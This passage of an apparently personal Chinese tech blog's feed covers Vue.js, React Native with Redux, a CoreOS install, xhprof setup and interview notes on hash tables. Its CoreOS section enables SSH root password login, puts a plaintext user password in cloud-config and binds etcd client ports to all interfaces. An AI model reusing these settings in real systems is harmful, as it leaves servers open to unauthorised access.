  &lt;div class=&quot;language-html highlighter-coderay&quot;&gt;&lt;div class=&quot;CodeRay&quot;&gt;
  &lt;div class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span style=&quot;color:#070;font-weight:bold&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span style=&quot;color:#b48&quot;&gt;v-on:click&lt;/span&gt;=&lt;span style=&quot;background-color:hsla(0,100%,50%,0.05)&quot;&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&quot;color:#D20&quot;&gt;doSomething&lt;/span&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;color:#070;font-weight:bold&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&quot;color:#070;font-weight:bold&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span style=&quot;color:#070;font-weight:bold&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span style=&quot;color:#F00;background-color:#FAA&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;color:#b48&quot;&gt;click&lt;/span&gt;=&lt;span style=&quot;background-color:hsla(0,100%,50%,0.05)&quot;&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&quot;color:#D20&quot;&gt;doSomething&lt;/span&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;color:#070;font-weight:bold&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&quot;color:#070;font-weight:bold&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
  &lt;/div&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;经验&quot;&gt;经验&lt;/h1&gt;

&lt;h2 id=&quot;1-css-的组件作用域&quot;&gt;1. CSS 的组件作用域&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;scoped 属性会自动添加一个唯一的属性（比如 data-v-21e5b78）为组件内 CSS 指定作用域，编译的时候 &lt;code&gt;.list-container:hover &lt;/code&gt;会被编译成类似 &lt;code&gt;.list-container[data-v-21e5b78]:hover&lt;/code&gt;
&lt;code&gt;&amp;lt;style scoped&amp;gt;&amp;lt;/style&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;2-页面闪烁&quot;&gt;2. 页面闪烁&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;这个指令保持在元素上直到关联实例结束编译。和 CSS 规则如 &lt;code&gt;[v-cloak] { display: none } &lt;/code&gt; 一起用时，这个指令可以隐藏未编译的 Mustache 标签直到实例准备完毕。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;3-抽象组件keep-alive&quot;&gt;3. 抽象组件&lt;code&gt;&amp;lt;keep-alive&amp;gt;&lt;/code&gt;&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;keep-alive&gt; 包裹动态组件时，会缓存不活动的组件实例，而不是销毁它们。
当组件在 &lt;keep-alive&gt; 内被切换，它的 activated 和 deactivated 这两个生命周期钩子函数将会被对应执行。
&lt;/keep-alive&gt;&lt;/keep-alive&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;库&quot;&gt;库&lt;/h1&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;http://element.eleme.io/#/zh-CN&quot;&gt;Element&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/ElemeFE/mint-ui&quot;&gt;Mint UI&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://router.vuejs.org/zh-cn/&quot;&gt;vue-router&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/vuejs/vue-cli&quot;&gt;vue-cli&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/vuejs/awesome-vue#libraries--plugins&quot;&gt;Awesome Vue.js&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cn.vuejs.org/&quot;&gt;Vue.js&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</content>
 </entry>
 
 <entry>
   <title>Reacct Native</title>
   <link href="http://yanpeipan.github.io/2017/01/07/reacct-native.html"/>
   <updated>2017-01-07T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2017/01/07/reacct-native</id>
   <content type="html">
&lt;hr /&gt;

&lt;nav&gt;
&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#搭建开发环境&quot; id=&quot;markdown-toc-搭建开发环境&quot;&gt;搭建开发环境&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#知识点&quot; id=&quot;markdown-toc-知识点&quot;&gt;知识点&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#javascript&quot; id=&quot;markdown-toc-javascript&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#testing&quot; id=&quot;markdown-toc-testing&quot;&gt;Testing&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#development&quot; id=&quot;markdown-toc-development&quot;&gt;Development&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#redux异步&quot; id=&quot;markdown-toc-redux异步&quot;&gt;Redux异步&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#redux-thunk&quot; id=&quot;markdown-toc-redux-thunk&quot;&gt;Redux-thunk&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#redux-promise&quot; id=&quot;markdown-toc-redux-promise&quot;&gt;redux-promise&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#redux-promise-middleware&quot; id=&quot;markdown-toc-redux-promise-middleware&quot;&gt;redux-promise-middleware&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#redux-loop&quot; id=&quot;markdown-toc-redux-loop&quot;&gt;redux-loop&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#redux-sage&quot; id=&quot;markdown-toc-redux-sage&quot;&gt;redux-sage&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#alias-in-react-native&quot; id=&quot;markdown-toc-alias-in-react-native&quot;&gt;Alias in React Native&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#use-providesmodule&quot; id=&quot;markdown-toc-use-providesmodule&quot;&gt;use @providesModule&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#use-babel-plugins&quot; id=&quot;markdown-toc-use-babel-plugins&quot;&gt;Use Babel Plugins&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#参考资料&quot; id=&quot;markdown-toc-参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;/nav&gt;

&lt;p&gt;总结近段时间以来的经验（深坑）。&lt;/p&gt;

&lt;h1 id=&quot;搭建开发环境&quot;&gt;搭建开发环境&lt;/h1&gt;
&lt;p&gt;文档已经非常详尽， 暂不赘述。&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;知识点&quot;&gt;知识点&lt;/h1&gt;

&lt;h2 id=&quot;javascript&quot;&gt;JavaScript&lt;/h2&gt;
&lt;blockquote&gt;

  &lt;ol&gt;
    &lt;li&gt;&lt;a href=&quot;https://facebook.github.io/react/&quot;&gt;&lt;code&gt;React&lt;/code&gt;&lt;/a&gt;: React是由Facebook和Instagram开发的用于构建用户界面的JS库，在MVC架构中属于V. A JAVASCRIPT LIBRARY FOR BUILDING USER INTERFACES&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;https://jsx.github.io/&quot;&gt;&lt;code&gt;JSX&lt;/code&gt;&lt;/a&gt; is a statically-typed, object-oriented programming language designed to run on modern web browsers&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;http://redux.js.org/&quot;&gt;&lt;code&gt;Redux&lt;/code&gt;&lt;/a&gt; 状态容器，提供可预测的状态管理。Predictable state container for JavaScript apps&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;https://github.github.io/fetch/&quot;&gt;&lt;code&gt;Fetch&lt;/code&gt;&lt;/a&gt; is a Promise-based mechanism for programatically making web requests in the browser&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;http://facebook.github.io/flux/&quot;&gt;&lt;code&gt;Flux&lt;/code&gt;&lt;/a&gt; APPLICATION ARCHITECTURE FOR BUILDING USER INTERFACES&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;http://www.ecma-international.org/ecma-262/6.0/index.html&quot;&gt;ES6&lt;/a&gt; ECMAScript® 2015 Language Specification&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;testing&quot;&gt;Testing&lt;/h2&gt;
&lt;blockquote&gt;

  &lt;ol&gt;
    &lt;li&gt;&lt;a href=&quot;http://facebook.github.io/jest/&quot;&gt;&lt;code&gt;Jest&lt;/code&gt;&lt;/a&gt; Jest is a JavaScript testing framework, used by Facebook to test all JavaScript code including React applications.&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;development&quot;&gt;Development&lt;/h2&gt;
&lt;blockquote&gt;

  &lt;ol&gt;
    &lt;li&gt;&lt;a href=&quot;https://nuclide.io/&quot;&gt;&lt;code&gt;Nuclide&lt;/code&gt;&lt;/a&gt; A unified developer experience for web and mobile development&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;https://flowtype.org/&quot;&gt;&lt;code&gt;Flow&lt;/code&gt;&lt;/a&gt; A STATIC TYPE CHECKER FOR JAVASCRIPT&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;redux异步&quot;&gt;Redux异步&lt;/h1&gt;

&lt;blockquote&gt;

  &lt;p&gt;Javascript语言的执行环境是”单线程”（single thread）。&lt;/p&gt;

  &lt;p&gt;Thund定义：编译器的”传名调用”实现，往往是将参数放到一个临时函数之中，再将这个临时函数传入函数体。这个临时函数就叫做 Thunk 函数。求值策略（即函数的参数到底应该何时求值）：传值调用（call by value)，传名调用（call by name)。&lt;/p&gt;

  &lt;p&gt;Promise对象是CommonJS工作组提出的一种规范，目的是为异步操作提供统一接口。&lt;/p&gt;

  &lt;p&gt;&lt;code&gt;Optimistic updates&lt;/code&gt;，是指不等待请求成功，在发送请求的同时立即渲染数据。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;redux-thunk&quot;&gt;Redux-thunk&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Thunk middleware for Redux&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;redux-promise&quot;&gt;redux-promise&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;FSA-compliant promise middleware for Redux.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;redux-promise-middleware&quot;&gt;redux-promise-middleware&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Redux middleware for resolving and rejecting promises with conditional &lt;code&gt;optimistic updates&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;redux-loop&quot;&gt;redux-loop&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;A library that ports Elm’s effect system to Redux&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;redux-sage&quot;&gt;redux-sage&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;An alternative side effect model for Redux apps&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;alias-in-react-native&quot;&gt;Alias in React Native&lt;/h1&gt;
&lt;blockquote&gt;

  &lt;p&gt;令人厌烦的引入方式：&lt;code&gt;import themes from '../../config/themes';&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;use-providesmodule&quot;&gt;use @providesModule&lt;/h2&gt;
&lt;blockquote&gt;

  &lt;p&gt;在文件头部引入注释, 了解更多：&lt;a href=&quot;https://github.com/facebook/fbjs&quot;&gt;FBJS&lt;/a&gt;&lt;/p&gt;

  &lt;div class=&quot;language-Javascript highlighter-coderay&quot;&gt;&lt;div class=&quot;CodeRay&quot;&gt;
  &lt;div class=&quot;code&quot;&gt;&lt;pre&gt;/**
 * @providesModule login
 */
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
  &lt;/div&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;use-babel-plugins&quot;&gt;Use Babel Plugins&lt;/h2&gt;
&lt;blockquote&gt;

  &lt;p&gt;&lt;a href=&quot;http://babeljs.io/&quot;&gt;Babel&lt;/a&gt; is a JavaScript compiler.&lt;/p&gt;

  &lt;div class=&quot;language-bash highlighter-coderay&quot;&gt;&lt;div class=&quot;CodeRay&quot;&gt;
  &lt;div class=&quot;code&quot;&gt;&lt;pre&gt;npm install --g babel-cli
npm install --save babel babel-plugin-module-resolver
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
  &lt;/div&gt;
  &lt;p&gt;.babelrc文件&lt;/p&gt;

  &lt;div class=&quot;language-json highlighter-coderay&quot;&gt;&lt;div class=&quot;CodeRay&quot;&gt;
  &lt;div class=&quot;code&quot;&gt;&lt;pre&gt;{
  &lt;span style=&quot;color:#606&quot;&gt;&lt;span style=&quot;color:#404&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span&gt;presets&lt;/span&gt;&lt;span style=&quot;color:#404&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;: [&lt;span style=&quot;background-color:hsla(0,100%,50%,0.05)&quot;&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&quot;color:#D20&quot;&gt;react-native&lt;/span&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;],
  &lt;span style=&quot;color:#606&quot;&gt;&lt;span style=&quot;color:#404&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span&gt;plugins&lt;/span&gt;&lt;span style=&quot;color:#404&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;: [
    [&lt;span style=&quot;background-color:hsla(0,100%,50%,0.05)&quot;&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&quot;color:#D20&quot;&gt;module-resolver&lt;/span&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;, {
      &lt;span style=&quot;color:#606&quot;&gt;&lt;span style=&quot;color:#404&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span&gt;root&lt;/span&gt;&lt;span style=&quot;color:#404&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;: [&lt;span style=&quot;background-color:hsla(0,100%,50%,0.05)&quot;&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&quot;color:#D20&quot;&gt;./js&lt;/span&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;],
      &lt;span style=&quot;color:#606&quot;&gt;&lt;span style=&quot;color:#404&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span&gt;alias&lt;/span&gt;&lt;span style=&quot;color:#404&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;: {
      }
    }]
  ]
}
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
  &lt;/div&gt;
  &lt;p&gt;.flowconfig文件（兼容Flow）&lt;/p&gt;

  &lt;pre&gt;&lt;code&gt;module.name_mapper='themes' -&amp;gt; '&amp;lt;PROJECT_ROOT&amp;gt;/js/themes'
module.name_mapper='actions' -&amp;gt; '&amp;lt;PROJECT_ROOT&amp;gt;/js/actions'
module.name_mapper='tabs' -&amp;gt; '&amp;lt;PROJECT_ROOT&amp;gt;/js/tabs'
module.name_mapper='reducers' -&amp;gt; '&amp;lt;PROJECT_ROOT&amp;gt;/js/reducers'
&lt;/code&gt;&lt;/pre&gt;
  &lt;p&gt;Atom安装&lt;code&gt;autocomplete-modules&lt;/code&gt;插件，并启用&lt;code&gt;babel-plugin-module-resolver&lt;/code&gt;。启动：&lt;code&gt;npm start -- --reset-cache&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;参考资料&quot;&gt;参考资料&lt;/h1&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;http://es6.ruanyifeng.com/&quot;&gt;ECMAScript 6 入门&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.ruanyifeng.com/blog/2015/05/thunk.html&quot;&gt;Thunk 函数的含义和用法&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://segmentfault.com/a/1190000007248878&quot;&gt;Redux异步方案选型&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/thunks/thunks/issues/1&quot;&gt;有Promise了为什么还要用Thunk？&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/jondot/awesome-react-native&quot;&gt;awesome-react-native&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</content>
 </entry>
 
 <entry>
   <title>CoreOS</title>
   <link href="http://yanpeipan.github.io/2016/11/15/coreos.html"/>
   <updated>2016-11-15T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2016/11/15/coreos</id>
   <content type="html">
&lt;h1 id=&quot;安装&quot;&gt;安装&lt;/h1&gt;

&lt;h2 id=&quot;下载镜像&quot;&gt;下载镜像&lt;/h2&gt;
&lt;p&gt;http://stable.release.core-os.net/amd64-usr/current/coreos_production_iso_image.iso&lt;/p&gt;

&lt;h2 id=&quot;livecd&quot;&gt;LiveCD&lt;/h2&gt;

&lt;h2 id=&quot;sshd&quot;&gt;sshd&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;cd /etc/ssh
mv sshd_config{,.bak}
cat sshd_config.bak &amp;gt; sshd_config
vim sshd_config
#...
PermitRootLogin yes  #加入这一句
systemctl restart sshd
sudo passwd root
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;cloud-configyaml&quot;&gt;cloud-config.yaml&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;#cloud-config
hostname: coreos01
coreos:
        units:
                - name: etcd2.service
                  command: start
                - name: fleet.service
                  command: start
        etcd2:
          discovery: https://discovery.etcd.io/bfb9403e71057fc7d8dc1f48064dbe5b
          advertise-client-urls: http://$private_ipv4:2379,http://$private_ipv4:4001
          initial-advertise-peer-urls: http://$private_ipv4:2380
          listen-client-urls: http://0.0.0.0:2379,http://0.0.0.0:4001
          listen-peer-urls: http://$private_ipv4:2380,http://$private_ipv4:7001
        fleet:
          metadata: role=coreos01
users:
        - name: core
          passwd: 295079529
          ssh-authorized-keys:
                - ssh-dss AAAAB3NzaC1kc3MAAACBAOa5RtATjQMxp7a9fnL6PeB5impl8pnsi2ZhlKrHzj5N80PVhntra+xGwnxsDFqBe7Y87MltP2yEGcUH/R5nsaDK6QOlXY/wHili4dmj3wl4qn7yORox/sRhhTNa1rT/XvdAu8trOb8jSU99xfFbuPSNkdgTLDNhpnDbZlhqjgk/AAAAFQCWHwTgRGJVyObt+3IxC328nMGCzQAAAIARHlP4/4AKYlCmBXYs6uqsM4cuqQaLcW6IpvhFSCXdw0zHYpRiu0IKY0BJwxhtdtRz8jGvTlqXfuqfvUy+zvLVqsS0SJlk2gVAGAlrCgC/W41VAiXmhv9y5fXAFC6IE2KRWNxw2dkBk1qwnYuKxyWUdR5VdRfJyFt8iMdBhORVUgAAAIAJ/+mD7KMQD3PADFyLRYwShexhHRwl1NDbvND+7KReozzSJEa+Kbz3z2/THFjh3ADr+CWEqizDJp3BRSK7Da+pS7i1y/hBlasTxQBxlVbi29YZKGLPesk9Qkxl0S1EeHKZKuv8fj7+A+1VY6xMiJF/uAb6hfur2cI7HIawXZ9HDg== yanpeipan@localhost
        - groups:
               - sudo
                - docker
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;coreos-install&quot;&gt;coreos-install&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;bash -x /usr/bin/coreos-install -d /dev/sda -c cloud-config.yaml -b http://192.168.1.?/amd64-usr/&lt;/code&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>xhprof</title>
   <link href="http://yanpeipan.github.io/2015/06/17/xhprof.html"/>
   <updated>2015-06-17T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2015/06/17/xhprof</id>
   <content type="html">
&lt;h2 id=&quot;克隆代码&quot;&gt;克隆代码&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;git clone https://github.com/phacility/xhprof.git /var/xhprof XHPROF_HOME
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;安装依赖&quot;&gt;安装依赖&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;pecl install pecl install channel://pecl.php.net/xhprof-0.9.4
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;配置phpini&quot;&gt;配置php.ini&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;extension=xhprof.so
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;添加文件-xhprof_homeexamplesprependphp&quot;&gt;添加文件 XHPROF_HOME/examples/prepend.php&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;xhprof_enable(XHPROF_FLAGS_NO_BUILTINS | XHPROF_FLAGS_CPU | XHPROF_FLAGS_MEMORY);
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;添加文件-xhprof_homeexamplesappendphp&quot;&gt;添加文件 XHPROF_HOME/examples/append.php&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;$xhprof_data = xhprof_disable();
$xhprof_runs = new XHProfRuns_Default();
$run_id = $xhprof_runs-&amp;gt;save_run($xhprof_data, &quot;xhprof_foo&quot;);

echo &quot;\n---------------\n&quot;.
&quot;http://XHPROF_HOST/index.php?run=$run_id&amp;amp;source=xhprof_foo\n&quot;.
&quot;---------------\n&quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;配置nginx&quot;&gt;配置nginx&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;fastcgi_param PHP_VALUE &quot;auto_prepend_file=XHPROF_HOME/examples/prepend.php \n auto_append_file=XHPROF_HOME/examples/append.php&quot;;
&lt;/code&gt;&lt;/pre&gt;
</content>
 </entry>
 
 <entry>
   <title>程序员面试金典</title>
   <link href="http://yanpeipan.github.io/2015/04/08/%E7%A8%8B%E5%BA%8F%E5%91%98%E9%9D%A2%E8%AF%95%E9%87%91%E5%85%B8.html"/>
   <updated>2015-04-08T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2015/04/08/程序员面试金典</id>
   <content type="html">
&lt;h1 id=&quot;面试考题&quot;&gt;面试考题&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;数据结构
    &lt;ul&gt;
      &lt;li&gt;数组与字符串&lt;/li&gt;
      &lt;li&gt;链表&lt;/li&gt;
      &lt;li&gt;栈与队列&lt;/li&gt;
      &lt;li&gt;树与图&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;概念与算法
    &lt;ul&gt;
      &lt;li&gt;位操作&lt;/li&gt;
      &lt;li&gt;智力题&lt;/li&gt;
      &lt;li&gt;数学与概率&lt;/li&gt;
      &lt;li&gt;面向对象设计&lt;/li&gt;
      &lt;li&gt;递归和动态规划&lt;/li&gt;
      &lt;li&gt;扩展性与存储限制&lt;/li&gt;
      &lt;li&gt;排序与查找&lt;/li&gt;
      &lt;li&gt;测试&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;知识类问题
    &lt;ul&gt;
      &lt;li&gt;C和C++&lt;/li&gt;
      &lt;li&gt;Java&lt;/li&gt;
      &lt;li&gt;数据库&lt;/li&gt;
      &lt;li&gt;线程与锁&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;附加面试题
    &lt;ul&gt;
      &lt;li&gt;中等难度&lt;/li&gt;
      &lt;li&gt;高等难度&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;数组与字符串&quot;&gt;数组与字符串&lt;/h2&gt;

&lt;p&gt;数组问题与字符串问题往往是相通的。换句话说, 书中提到的数组问题也可能以字符串的形式出现，反之亦然。&lt;/p&gt;

&lt;h3 id=&quot;哈希表&quot;&gt;哈希表&lt;/h3&gt;
&lt;p&gt;散列表（Hash table，也叫哈希表），是根据关键字（Key-value）而直接访问在内存存储位置的数据结构。也就是说，它通过计算一个关于键值的函数，将所需查询的数据映射到表中一个位置来访问记录，这加快了查找速度。这个映射函数称做散列函数，存放记录的数组称做散列表。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;链式哈希表
    &lt;ul&gt;
      &lt;li&gt;将数据存储在”桶”(bucket)中, 每个”桶”都是一个链表, 且链表的容量随着冲突的增加而增大.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;开地址哈希表
    &lt;ul&gt;
      &lt;li&gt;将数据存储在表本身, 并通过各种探查方法来避免冲突问题.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;用二叉查找树实现哈希表
    &lt;ul&gt;
      &lt;li&gt;搜索、插入、删除的复杂度等于树高, 期望O(log n),最坏O(n)（数列有序，树退化成线性表）.通常采取二叉链表作为二叉查找树的存储结构.&lt;/li&gt;
      &lt;li&gt;虽然二叉查找树的最坏效率是O(n),但它支持动态查询，且有很多改进版的二叉查找树可以使树高为O(log n),如SBT,AVL树，红黑树等。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;哈希函数&lt;/li&gt;
&lt;/ol&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;广泛运用DJBX33A (Daniel J. Bernstein, Times 33 with Addition)&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt;  uint32_t time33(char const *str, int len) 
  {
      unsigned long  hash = 0; 
      for (int i = 0; i &amp;lt; len; i++) {
              hash = hash *33 + (unsigned long) str[i]; 
      } 
      return hash; 
  }
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;另一个哈希函数, 改编自:&amp;lt;Compilers: Principles, Techniques, and Tools&amp;gt;&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt;  unsigned int hashpjw(const void *key) {
    const char *ptr;
    unsigned int val;

    // Hash the key by performing a number of bit operations on it
    val = 0;
    ptr = key;
    while (*ptr != '\0') {
      unsigned int tmp;
      val = (val &amp;lt;&amp;lt; 4) + (*ptr);

      if ((tmp = (val &amp;amp; 0xf0000000))) {
        val = val ^ (tmp &amp;gt;&amp;gt; 24);
        val = val ^ tmp;
      }

      ptr++;
    }

    // in practice , replace PRIME_TBLESIZ with the actual table size
    return val % PRIME_TBLESIZ;
  }
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;arraylist动态数组&quot;&gt;ArrayList(动态数组)&lt;/h3&gt;

&lt;p&gt;按需动态调整大小的数组, 数据访问时间为O(1).&lt;/p&gt;

&lt;h3 id=&quot;stringbuffer&quot;&gt;StringBuffer&lt;/h3&gt;

&lt;p&gt;创建一个足以容纳所有字符串的数组, 等它拼接完成才将这些字符串转成一个字符串.&lt;/p&gt;

&lt;h3 id=&quot;面试题目&quot;&gt;面试题目&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;实现一个算法, 确定一个字符串的所有字符是否全都不同.即使不允许使用额外的数据结构,又该如何处理?&lt;/li&gt;
  &lt;li&gt;用C或C++实现void reverse( char* str)函数, 即反转一个null结尾的字符.&lt;/li&gt;
  &lt;li&gt;给定两个字符串, 请编写程序, 确定其中一个字符串的字符重新排列后,能否变成另一个字符串.&lt;/li&gt;
  &lt;li&gt;编写一个方法, 将字符串中的空格全部替换为“% 20”。假定该字符串尾部有足够的空间存放新增字符,并且知道字符串的”真实”长度.&lt;/li&gt;
  &lt;li&gt;利用字符串重复出现的次数，编写一个方法，实现基本的字符串压缩功能，比如字符串aabcccccaaa会变成a2b1c5a3，若压缩后的字符串没有变短，则返回原来的字符串&lt;/li&gt;
  &lt;li&gt;一张图像表示成NxN的矩阵，图像中每个像素是4个字节，写一个函数把图像旋转90度。 你能原地进行操作吗？(即不开辟额外的存储空间)&lt;/li&gt;
  &lt;li&gt;编写一个算法, 若M × N矩阵中某个元素为0, 则将其所在的行与列清零&lt;/li&gt;
